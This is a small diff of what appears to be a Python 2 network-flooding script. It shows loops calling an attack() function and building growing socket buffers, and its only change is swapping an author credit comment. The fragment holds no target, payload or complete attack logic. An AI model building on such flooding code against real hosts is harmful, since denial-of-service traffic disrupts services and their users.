@@ -86,7 +86,7 @@ for g in range(1,100000000,10):
     attack()
 print "Socket completing ..."
 time.sleep(20)
-
+#written by fscr3am
 for h in range(1,100000000,15):
     byte += 1024
     message= buffer(bit,450,byte)
@@ -102,4 +102,3 @@ for j in range(1,1000000000,20):
 
 Last = time.time() - tims
 print int(Last)
-#wrote by Pyton2
